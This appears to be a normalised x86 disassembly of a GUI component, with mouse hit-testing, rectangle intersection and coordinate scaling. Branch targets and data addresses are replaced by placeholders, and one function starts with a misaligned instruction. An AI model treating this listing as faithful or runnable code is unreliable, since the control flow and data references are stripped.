push [ ebp + 0x3c ]
push [ ebp + 0x38 ]
mov eax [ ebx + 0x2f0 ]
call sub_466420
push [ ebp + 0x34 ]
push [ ebp + 0x30 ]
push [ ebp + 0x2c ]
push [ ebp + 0x28 ]
mov eax [ ebx + 0x2f4 ]
call sub_466420
mov [ ebx + 0x2c4 ] 0x1
cmp [ ebx + 0x2e2 ] 0x0
je r-xdata
mov esi [ ebx + 0x2b0 ]
dec esi
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x40
mov edx ebx
mov eax [ ebx + 0x2e4 ]
call [ ebx + 0x2e0 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
mov eax [ ebx + 0x2f8 ]
call sub_47270c
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebx + 0x2fc ]
call sub_47270c
push [ ebp + 0x44 ]
push [ ebp + 0x40 ]
push [ ebp + 0x3c ]
push [ ebp + 0x38 ]
mov eax [ ebx + 0x2f0 ]
call sub_47270c
push [ ebp + 0x34 ]
push [ ebp + 0x30 ]
push [ ebp + 0x2c ]
push [ ebp + 0x28 ]
mov eax [ ebx + 0x2f4 ]
call sub_47270c
mov eax ebx
call sub_43aaac
dec esi
jne r-xdata
sub_472878
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax ebx
call sub_466cd4
test al al
je r-xdata
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0xc ]
mov [ edx ] 0x2
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0xc ]
mov [ edx + 0x9 ] ebx
sub_4728ac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0xc ] ecx
mov esi eax
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax + 0x1 ] 0xffffffff
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x5 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x9 ] edx
mov eax esi
call sub_46e68c
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x348 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax esi
call sub_46da00
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x3b8 ]
call sub_471824
test al al
je r-xdata
inc edi
xor ebx ebx
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xf4 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x1 ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x35c ]
call sub_471824
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax ] 0x4
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_46da00
mov edx [ ebp - 0xc ]
mov [ edx + 0x5 ] eax
mov eax [ ebp - 0xc ]
mov [ eax ] 0x3
jmp r-xdata
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea eax [ esi + 0x28e ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax ] 0x5
jmp r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x348 ]
call sub_414098
call sub_472878
pop ecx
test al al
jne r-xdata
mov ebx [ esi + 0x364 ]
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax [ esi + 0x2e8 ]
call sub_46cf30
test eax eax
jle r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_474a90
mov edi eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x1 ] edi
mov eax [ ebp - 0xc ]
inc edi
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax ] 0x6
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
sub_472a14
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x2b5 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x2b6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x5 ]
cmp al [ rw-data ]
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x5 ]
cmp al [ rw-data ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x6 ]
not eax
and al [ rw-data ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x6 ]
not eax
and al [ rw-data ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
call sub_43a77c
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x284 ]
call sub_4622c4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_461858
mov eax [ ebp + 0x8 ]
mov [ eax - 0x7 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
call sub_43a77c
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_4622c4
mov eax [ ebp + 0x8 ]
mov [ eax - 0x7 ] 0x1
sub_472ae0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x3d2 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x28d ] 0x1
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x6 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov cl [ eax - 0x5 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebx + 0x3d4 ]
call [ ebx + 0x3d0 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov al [ eax + 0x28d ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x7 ] al
sub_472b4c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_43bb38
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x284 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28d ] 0x0
je r-xdata
lea ecx [ ebp - 0x1c ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
call sub_412bb8
lea edx [ ebp - 0x1c ]
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4728ac
mov [ ebp - 0x7 ] 0x0
mov al [ ebp - 0x14 ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28d ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x3da ] 0x0
je r-xdata
dec al
je r-xdata
cmp [ ebp - 0x7 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28d ] 0x1
mov al [ ebp - 0x6 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ebx [ ebp - 0x4 ]
mov cl [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x3dc ]
call [ ebx + 0x3d8 ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x28d ]
mov [ ebp - 0x7 ] al
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x3ca ] 0x0
je r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28d ] 0x0
push ebp
call sub_472ae0
pop ecx
cmp [ ebp - 0x7 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28d ] 0x1
mov al [ ebp - 0x5 ]
push eax
mov al [ ebp - 0x6 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0xb ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x3cc ]
call [ ebx + 0x3c8 ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x28d ]
mov [ ebp - 0x7 ] al
mov al [ ebp - 0x5 ]
push eax
mov al [ ebp - 0x6 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x13 ]
mov ebx [ ebp - 0xf ]
mov edx ebx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x11c ]
mov [ ebp - 0x7 ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x3e2 ] 0x0
je r-xdata
sub al 0x3
je r-xdata
push ebp
call sub_472a14
pop ecx
jmp r-xdata
cmp [ ebp - 0x7 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28d ] 0x1
mov eax [ ebp - 0x13 ]
push eax
mov al [ ebp - 0x5 ]
push eax
mov al [ ebp - 0x6 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0xf ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x3e4 ]
call [ ebx + 0x3e0 ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x28d ]
mov [ ebp - 0x7 ] al
push ebp
call sub_472ae0
pop ecx
cmp [ ebp - 0x7 ] 0x0
jne r-xdata
jmp r-xdata
push ebp
call sub_472a14
pop ecx
jmp r-xdata
push ebp
call sub_472a14
pop ecx
sub_472d4c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_464fa8
fstp [ ebp - 0x24 ]
fwait
mov edx edi
mov eax ebx
call sub_464fa8
fsubr [ ebp - 0x24 ]
fstp [ ebp - 0x8 ]
fwait
fld [ ebx + 0x18 ]
fadd [ ebp - 0x8 ]
fstp [ ebp - 0x10 ]
fwait
fld [ ebx + 0x10 ]
fadd [ ebp - 0x8 ]
fstp [ ebp - 0x18 ]
fwait
mov [ ebp - 0x19 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x3c2 ] 0x0
je r-xdata
cmp [ ebp - 0x19 ] 0x0
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ esi + 0x3c4 ]
call [ esi + 0x3c0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
mov eax ebx
call sub_466420
sub_472de0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_46e68c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_46e68c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_46da00
mov edx [ ebp + 0x8 ]
mov ecx [ edx - 0x8 ]
mov edx [ ebp + 0x8 ]
mov dl [ edx - 0x9 ]
mov edi [ eax ]
call [ edi + 0x118 ]
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_46da00
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xf4 ]
inc eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ eax + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43a77c
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_472ea8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x2
mov al 0x1
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov dl [ edx + 0x2b6 ]
cmp al dl
je r-xdata
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0xc ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x348 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp dl 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xa ] 0x1
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x348 ]
mov edx esi
call sub_414098
cmp [ eax + 0xe0 ] 0x0
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
cmp [ eax + 0x8e ] 0x0
jne r-xdata
cmp [ eax + 0x8e ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_472d4c
pop ecx
sub_472f5c
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x9 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov dl [ ebp - 0x9 ]
mov eax [ ebp - 0x4 ]
call sub_43bdf0
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x284 ]
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x26c ]
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebx + 0x10 ]
jne r-xdata
push ebp
call sub_472de0
pop ecx
test al al
jne r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
call sub_412bb8
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
add eax 0x28e
push eax
call PtInRect
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_461858
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
call sub_461858
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov dx [ eax + 0x268 ]
mov eax [ ebp - 0x4 ]
call sub_43a77c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
mov [ eax + 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebx + 0x10 ]
jne r-xdata
mov [ ebp - 0xa ] 0x0
mov eax ebx
call sub_462298
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x368 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x14 ]
je r-xdata
push ebp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov al 0x1
call sub_472ea8
pop ecx
push ebp
mov ecx [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
xor eax eax
call sub_472ea8
pop ecx
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x14 ] eax
cmp [ ebp - 0xa ] 0x0
je r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebp - 0x4 ]
call sub_47207c
mov eax [ ebp - 0x4 ]
lea esi [ ebp - 0x60 ]
lea edi [ eax + 0x369 ]
mov ecx 0x13
[ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x368 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
sub_4730f0
push ebp
mov ebp esp
add esp 0xfffffff4
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x1 ] dl
lea edx [ ebp - 0x9 ]
push edx
mov dl [ ebp - 0x1 ]
call sub_43aed0
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_473118
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
mov eax [ edi + 0x348 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
xor esi esi
inc esi
dec ebp
jne r-xdata
fld [ eax + 0x10 ]
fsub [ eax + 0x18 ]
fmul [ r-xdata ]
fld [ r-xdata ]
fmulp st1
fstp [ esp ]
fwait
test bl bl
jne r-xdata
mov eax [ edi + 0x348 ]
mov edx esi
call sub_414098
cmp [ eax + 0x8e ] 0x0
jne r-xdata
push [ esp + 0x4 ]
push [ esp + 0x4 ]
xor edx edx
call sub_466928
fld [ esp ]
fchs
fstp [ esp ]
fwait
sub_47319a
add [ eax ] al
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov esi eax
lea ecx [ esp + 0x1 ]
mov dl [ esp ]
mov eax esi
call sub_43af94
mov ebx eax
mov dl 0x1
mov eax esi
call sub_473118
mov eax ebx
add esp 0xc
pop edi
pop esi
pop ebx
retn
sub_4731d4
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov esi eax
lea ecx [ esp + 0x1 ]
mov dl [ esp ]
mov eax esi
call sub_43afe0
mov ebx eax
xor edx edx
mov eax esi
call sub_473118
mov eax ebx
add esp 0xc
pop edi
pop esi
pop ebx
retn
sub_473238
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x284 ]
mov eax esi
call sub_462298
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x2f0 ]
call sub_464fa8
add esp 0xfffffff8
fstp [ esp ]
fwait
mov edx [ esi + 0x10 ]
mov eax [ ebx + 0x2f0 ]
call sub_464fa8
add esp 0xfffffff8
fstp [ esp ]
fwait
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x2f4 ]
call sub_464fa8
add esp 0xfffffff8
fstp [ esp ]
fwait
mov edx [ esi + 0x10 ]
mov eax [ ebx + 0x2f4 ]
call sub_464fa8
add esp 0xfffffff8
fstp [ esp ]
fwait
mov edx [ esi + 0x14 ]
mov eax [ ebx + 0x2f8 ]
call sub_464fa8
add esp 0xfffffff8
fstp [ esp ]
fwait
mov edx [ esi + 0xc ]
mov eax [ ebx + 0x2f8 ]
call sub_464fa8
add esp 0xfffffff8
fstp [ esp ]
fwait
mov edx [ esi + 0x14 ]
mov eax [ ebx + 0x2fc ]
call sub_464fa8
add esp 0xfffffff8
fstp [ esp ]
fwait
mov edx [ esi + 0xc ]
mov eax [ ebx + 0x2fc ]
call sub_464fa8
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_472744
pop esi
pop ebx
retn
sub_4732fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_43be98
mov eax ebx
call sub_46e68c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x284 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
inc esi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x26c ]
mov [ eax + 0x4 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov dl [ ebp - 0x1 ]
cmp dl [ rw-data ]
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46da00
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov edi [ eax ]
call [ edi + 0x120 ]
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
mov esi eax
mov [ esi + 0x4 ] 0x0
mov eax ebx
call sub_461858
mov eax [ ebx + 0x288 ]
mov eax [ eax + 0xc ]
mov dl 0x4
call sub_41d3f0
mov eax [ ebp + 0xc ]
mov [ esi + 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x14 ] eax
mov eax [ esi + 0x10 ]
sub eax [ esi + 0x8 ]
cdq
xor eax edx
sub eax edx
cmp eax 0x10
jle r-xdata
mov eax [ esi + 0x14 ]
sub eax [ esi + 0xc ]
cdq
xor eax edx
sub eax edx
cmp eax 0x10
jle r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ esi + 0x8 ]
jle r-xdata
mov eax ebx
mov si 0xffb3
call sub_403394
mov eax [ esi + 0x14 ]
cmp eax [ esi + 0xc ]
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x118 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_473404
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx eax
mov eax [ ebx + 0x348 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebx
call sub_46da18
cmp [ ebx + 0x278 ] 0x0
je r-xdata
inc esi
xor edi edi
mov eax ebx
call sub_4617c4
lea esi [ ebx + 0x28e ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebx + 0x348 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x27c ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x348 ]
call sub_414098
call sub_465858
inc edi
dec esi
jne r-xdata
mov esi esp
lea edi [ ebx + 0x28e ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax ebx
call sub_4617c4
mov eax [ ebx + 0x348 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
cmp [ ebx + 0x300 ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
push esi
push edi
lea esi [ esp + 0x8 ]
lea edi [ esp + 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
cmp edi 0x5
setl cl
lea edx [ esp + 0x10 ]
mov eax ebp
call sub_468a2c
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x18 ]
push eax
call IntersectRect
test eax eax
je r-xdata
xor edi edi
mov eax [ ebx + 0x354 ]
mov edi [ eax + 0x14 ]
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x348 ]
call sub_414098
call sub_466e44
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ ebx + 0x348 ]
call sub_414098
mov ebp eax
mov edx ebp
mov eax ebx
call sub_46d390
test al al
je r-xdata
push esi
push edi
lea esi [ esp + 0x18 ]
lea edi [ esp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea ecx [ ebx + 0x28e ]
mov eax [ ebx + 0x280 ]
cdq
xor eax edx
sub eax edx
add eax edi
sub [ ecx + 0x8 ] eax
mov eax [ ebx + 0x254 ]
cdq
xor eax edx
sub eax edx
add edi eax
add [ ecx + 0x4 ] edi
sub_47355c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x0
lea eax [ ebp - 0x20 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_412be0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_46e68c
mov esi eax
dec esi
test esi esi
jl r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_465754
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc esi
mov [ ebp - 0x10 ] 0x0
inc [ ebp - 0x10 ]
dec esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x94 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
call sub_46da00
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8e ] 0x0
je r-xdata
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x138 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x134 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_460384
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x20 ]
call sub_460384
mov [ ebp - 0x20 ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
call sub_460384
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
call sub_460384
mov [ ebp - 0x18 ] eax
